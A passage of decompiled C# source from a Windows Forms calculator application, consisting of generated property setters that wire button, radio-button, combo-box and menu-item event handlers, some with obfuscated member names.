				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_x_y
	{
		[CompilerGenerated]
		get
		{
			return mAtAtoiCpn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_46);
			EventHandler eventHandler = method_97;
			EventHandler eventHandler2 = method_153;
			Button val2 = mAtAtoiCpn;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			mAtAtoiCpn = value;
			val2 = mAtAtoiCpn;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_ln
	{
		[CompilerGenerated]
		get
		{
			return _btn_ln;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_48);
			EventHandler eventHandler = method_99;
			EventHandler eventHandler2 = method_155;
			Button val2 = _btn_ln;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_ln = value;
			val2 = _btn_ln;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_c_f
	{
		[CompilerGenerated]
		get
		{
			return _btn_c_f;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_50);
			EventHandler eventHandler = method_101;
			EventHandler eventHandler2 = method_152;
			Button val2 = _btn_c_f;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_c_f = value;
			val2 = _btn_c_f;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_f_c
	{
		[CompilerGenerated]
		get
		{
			return _btn_f_c;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_44);
			EventHandler eventHandler = method_95;
			EventHandler eventHandler2 = method_151;
			Button val2 = _btn_f_c;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_f_c = value;
			val2 = _btn_f_c;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	[field: AccessedThroughProperty("grp_basic")]
	internal virtual GroupBox grp_basic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grp_advance_top")]
	internal virtual GroupBox grp_advance_top
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grp_advance_bottom")]
	internal virtual GroupBox grp_advance_bottom
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FileToolStripMenuItem")]
	internal virtual ToolStripMenuItem FileToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("StandardToolStripMenuItem")]
	internal virtual ToolStripMenuItem StandardToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ScientificToolStripMenuItem")]
	internal virtual ToolStripMenuItem ScientificToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("BaseConversionToolStripMenuItem")]
	internal virtual ToolStripMenuItem BaseConversionToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripMenuItem1")]
	internal virtual ToolStripSeparator ToolStripMenuItem1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("QuitToolStripMenuItem")]
	internal virtual ToolStripMenuItem QuitToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("EditToolStripMenuItem")]
	internal virtual ToolStripMenuItem EditToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CopyToolStripMenuItem")]
	internal virtual ToolStripMenuItem CopyToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PasteToolStripMenuItem")]
	internal virtual ToolStripMenuItem PasteToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("HelpToolStripMenuItem")]
	internal virtual ToolStripMenuItem HelpToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("HistoryToolStripMenuItem")]
	internal virtual ToolStripMenuItem HistoryToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("AboutMeToolStripMenuItem")]
	internal virtual ToolStripMenuItem AboutMeToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual RadioButton radio_binary
	{
		[CompilerGenerated]
		get
		{
			return _radio_binary;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_165;
			RadioButton val = _radio_binary;
			if (val != null)
			{
				val.remove_CheckedChanged(eventHandler);
			}
			_radio_binary = value;
			val = _radio_binary;
			if (val != null)
			{
				val.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton radio_decimal
	{
		[CompilerGenerated]
		get
		{
			return _radio_decimal;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_168;
			RadioButton val = _radio_decimal;
			if (val != null)
			{
				val.remove_CheckedChanged(eventHandler);
			}
			_radio_decimal = value;
			val = _radio_decimal;
			if (val != null)
			{
				val.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton radio_octal
	{
		[CompilerGenerated]
		get
		{
			return _radio_octal;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_167;
			RadioButton val = _radio_octal;
			if (val != null)
			{
				val.remove_CheckedChanged(eventHandler);
			}
			_radio_octal = value;
			val = _radio_octal;
			if (val != null)
			{
				val.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton radio_hexadecimal
	{
		[CompilerGenerated]
		get
		{
			return _radio_hexadecimal;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_166;
			RadioButton val = _radio_hexadecimal;
			if (val != null)
			{
				val.remove_CheckedChanged(eventHandler);
			}
			_radio_hexadecimal = value;
			val = _radio_hexadecimal;
			if (val != null)
			{
				val.add_CheckedChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("grp_conversion")]
	internal virtual GroupBox grp_conversion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btn_c
	{
		[CompilerGenerated]
		get
		{
			return _btn_c;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_53);
			EventHandler eventHandler = method_104;
			EventHandler eventHandler2 = method_161;
			Button val2 = _btn_c;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_c = value;
			val2 = _btn_c;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_b
	{
		[CompilerGenerated]
		get
		{
			return _btn_b;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_54);
			EventHandler eventHandler = method_105;
			EventHandler eventHandler2 = method_162;
			Button val2 = _btn_b;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_b = value;
			val2 = _btn_b;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_a
	{
		[CompilerGenerated]
		get
		{
			return _btn_a;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_55);
			EventHandler eventHandler = method_106;
			EventHandler eventHandler2 = method_163;
			Button val2 = _btn_a;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_a = value;
			val2 = _btn_a;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_e
	{
		[CompilerGenerated]
		get
		{
			return _btn_e;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_52);
			EventHandler eventHandler = method_103;
			EventHandler eventHandler2 = method_160;
			Button val2 = _btn_e;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_e = value;
			val2 = _btn_e;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_d
	{
		[CompilerGenerated]
		get
		{
			return _btn_d;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_51);
			EventHandler eventHandler = method_102;
			EventHandler eventHandler2 = method_159;
			Button val2 = _btn_d;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_d = value;
			val2 = _btn_d;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem2")]
	internal virtual ToolStripSeparator ToolStripMenuItem2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("OptionToolStripMenuItem")]
	internal virtual ToolStripMenuItem OptionToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btn_decimal_point
	{
		[CompilerGenerated]
		get
		{
			return _btn_decimal_point;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_29);
			EventHandler eventHandler = method_80;
			EventHandler eventHandler2 = method_137;
			Button val2 = _btn_decimal_point;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_decimal_point = value;
			val2 = _btn_decimal_point;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_equal
	{
		[CompilerGenerated]
		get
		{
			return _btn_equal;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_30);
			EventHandler eventHandler = method_81;
			EventHandler eventHandler2 = method_138;
			Button val2 = _btn_equal;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_equal = value;
			val2 = _btn_equal;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual TextBox txtmain
	{
		[CompilerGenerated]
		get
		{
			return _txtmain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_169;
			TextBox val = _txtmain;
			if (val != null)
			{
				((Control)val).remove_TextChanged(eventHandler);
			}
			_txtmain = value;
			val = _txtmain;
			if (val != null)
			{
				((Control)val).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual ComboBox combo_memory
	{
		[CompilerGenerated]
		get
		{
			return _combo_memory;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_133;
			ComboBox val = _combo_memory;
			if (val != null)
			{
				val.remove_SelectedIndexChanged(eventHandler);
			}
			_combo_memory = value;
			val = _combo_memory;
			if (val != null)
			{
				val.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	internal virtual Button btn_deg
	{
		[CompilerGenerated]
		get
		{
			return _btn_deg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_40);
			EventHandler eventHandler = method_91;
			EventHandler eventHandler2 = method_147;
			Button val2 = _btn_deg;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_deg = value;
			val2 = _btn_deg;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_rad
	{
		[CompilerGenerated]
		get
		{
			return _btn_rad;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_41);
			EventHandler eventHandler = method_92;
			EventHandler eventHandler2 = method_148;
			Button val2 = _btn_rad;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_rad = value;
			val2 = _btn_rad;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	[field: AccessedThroughProperty("radio_rad")]
	internal virtual RadioButton radio_rad
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("radio_degree")]
	internal virtual RadioButton radio_degree
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btn_f
	{
		[CompilerGenerated]
		get
		{
			return _btn_f;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_164;
			Button val = _btn_f;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btn_f = value;
			val = _btn_f;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("MenuStrip1")]
	internal virtual MenuStrip MenuStrip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("AvatorToolStripMenuItem")]
	internal virtual ToolStripMenuItem AvatorToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem StandardToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _StandardToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_1;
			ToolStripMenuItem standardToolStripMenuItem = _StandardToolStripMenuItem1;
			if (standardToolStripMenuItem != null)
			{
				((ToolStripItem)standardToolStripMenuItem).remove_Click(eventHandler);
			}
			_StandardToolStripMenuItem1 = value;
			standardToolStripMenuItem = _StandardToolStripMenuItem1;
			if (standardToolStripMenuItem != null)
			{
				((ToolStripItem)standardToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ScientificToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _ScientificToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_2;
			ToolStripMenuItem scientificToolStripMenuItem = _ScientificToolStripMenuItem1;
			if (scientificToolStripMenuItem != null)
			{
				((ToolStripItem)scientificToolStripMenuItem).remove_Click(eventHandler);
			}
			_ScientificToolStripMenuItem1 = value;
			scientificToolStripMenuItem = _ScientificToolStripMenuItem1;
			if (scientificToolStripMenuItem != null)
			{
				((ToolStripItem)scientificToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ConversionToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ConversionToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_3;
			ToolStripMenuItem conversionToolStripMenuItem = _ConversionToolStripMenuItem;
			if (conversionToolStripMenuItem != null)
			{
				((ToolStripItem)conversionToolStripMenuItem).remove_Click(eventHandler);
			}
			_ConversionToolStripMenuItem = value;
			conversionToolStripMenuItem = _ConversionToolStripMenuItem;
			if (conversionToolStripMenuItem != null)
			{
				((ToolStripItem)conversionToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem3")]
	internal virtual ToolStripSeparator ToolStripMenuItem3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem QuitToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _QuitToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_4;
			ToolStripMenuItem quitToolStripMenuItem = _QuitToolStripMenuItem1;
			if (quitToolStripMenuItem != null)
			{
				((ToolStripItem)quitToolStripMenuItem).remove_Click(eventHandler);
			}
			_QuitToolStripMenuItem1 = value;
			quitToolStripMenuItem = _QuitToolStripMenuItem1;
			if (quitToolStripMenuItem != null)
			{
				((ToolStripItem)quitToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("EditToolStripMenuItem1")]
	internal virtual ToolStripMenuItem EditToolStripMenuItem1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem CopyToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _CopyToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_5;
			ToolStripMenuItem copyToolStripMenuItem = _CopyToolStripMenuItem1;
			if (copyToolStripMenuItem != null)
			{
				((ToolStripItem)copyToolStripMenuItem).remove_Click(eventHandler);
			}
			_CopyToolStripMenuItem1 = value;
			copyToolStripMenuItem = _CopyToolStripMenuItem1;
			if (copyToolStripMenuItem != null)
			{
				((ToolStripItem)copyToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem PasteToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _PasteToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_6;
			ToolStripMenuItem pasteToolStripMenuItem = _PasteToolStripMenuItem1;
			if (pasteToolStripMenuItem != null)
			{
				((ToolStripItem)pasteToolStripMenuItem).remove_Click(eventHandler);
			}
			_PasteToolStripMenuItem1 = value;
			pasteToolStripMenuItem = _PasteToolStripMenuItem1;
			if (pasteToolStripMenuItem != null)
			{
				((ToolStripItem)pasteToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem4")]
	internal virtual ToolStripSeparator ToolStripMenuItem4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem SelectAllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SelectAllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_7;
			ToolStripMenuItem selectAllToolStripMenuItem = _SelectAllToolStripMenuItem;
			if (selectAllToolStripMenuItem != null)
			{
				((ToolStripItem)selectAllToolStripMenuItem).remove_Click(eventHandler);
			}
			_SelectAllToolStripMenuItem = value;
			selectAllToolStripMenuItem = _SelectAllToolStripMenuItem;
			if (selectAllToolStripMenuItem != null)
			{
				((ToolStripItem)selectAllToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("HelpToolStripMenuItem1")]
	internal virtual ToolStripMenuItem HelpToolStripMenuItem1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem HelpMeToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _HelpMeToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_8;
			ToolStripMenuItem helpMeToolStripMenuItem = _HelpMeToolStripMenuItem;
			if (helpMeToolStripMenuItem != null)
			{
				((ToolStripItem)helpMeToolStripMenuItem).remove_Click(eventHandler);
			}
			_HelpMeToolStripMenuItem = value;
			helpMeToolStripMenuItem = _HelpMeToolStripMenuItem;
			if (helpMeToolStripMenuItem != null)
			{
				((ToolStripItem)helpMeToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem AboutToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AboutToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_9;
			ToolStripMenuItem aboutToolStripMenuItem = _AboutToolStripMenuItem;
			if (aboutToolStripMenuItem != null)
			{
				((ToolStripItem)aboutToolStripMenuItem).remove_Click(eventHandler);
			}
			_AboutToolStripMenuItem = value;
			aboutToolStripMenuItem = _AboutToolStripMenuItem;
			if (aboutToolStripMenuItem != null)
			{
				((ToolStripItem)aboutToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem5")]
	internal virtual ToolStripSeparator ToolStripMenuItem5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem OptionToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _OptionToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = olIiHyIyaT;
			ToolStripMenuItem optionToolStripMenuItem = _OptionToolStripMenuItem1;
			if (optionToolStripMenuItem != null)
			{
				((ToolStripItem)optionToolStripMenuItem).remove_Click(eventHandler);
			}
			_OptionToolStripMenuItem1 = value;
			optionToolStripMenuItem = _OptionToolStripMenuItem1;
			if (optionToolStripMenuItem != null)
			{
				((ToolStripItem)optionToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("cms_1")]
	internal virtual ContextMenuStrip cms_1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem cms_close
	{
		[CompilerGenerated]
		get
		{
			return _cms_close;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_170;
			ToolStripMenuItem val = _cms_close;
			if (val != null)
			{
				((ToolStripItem)val).remove_Click(eventHandler);
			}
			_cms_close = value;
			val = _cms_close;
			if (val != null)
			{
				((ToolStripItem)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem6")]
	internal virtual ToolStripSeparator ToolStripMenuItem6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem cms_about
	{
		[CompilerGenerated]
		get
		{
			return _cms_about;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_171;
			ToolStripMenuItem val = _cms_about;
			if (val != null)
			{
				((ToolStripItem)val).remove_Click(eventHandler);
			}
			_cms_about = value;
			val = _cms_about;
			if (val != null)
			{
				((ToolStripItem)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual ComboBox cmb_box_unit
	{
		[CompilerGenerated]
		get
		{
			return _cmb_box_unit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_172;
			ComboBox val = _cmb_box_unit;
			if (val != null)
			{
				val.remove_SelectedIndexChanged(eventHandler);
			}
			_cmb_box_unit = value;
			val = _cmb_box_unit;
			if (val != null)
			{
				val.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btn_e_2
	{
		[CompilerGenerated]
		get
		{
			return _btn_e_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_42);
			EventHandler eventHandler = method_93;
			EventHandler eventHandler2 = method_149;
			Button val2 = _btn_e_2;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_e_2 = value;
			val2 = _btn_e_2;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_e_x
	{
		[CompilerGenerated]
		get
		{
			return _btn_e_x;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_43);
			EventHandler eventHandler = method_94;
			EventHandler eventHandler2 = method_150;
			Button val2 = _btn_e_x;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_e_x = value;
			val2 = _btn_e_x;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_n
	{
		[CompilerGenerated]
		get
		{
			return _btn_n;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_56);
			EventHandler eventHandler = method_107;
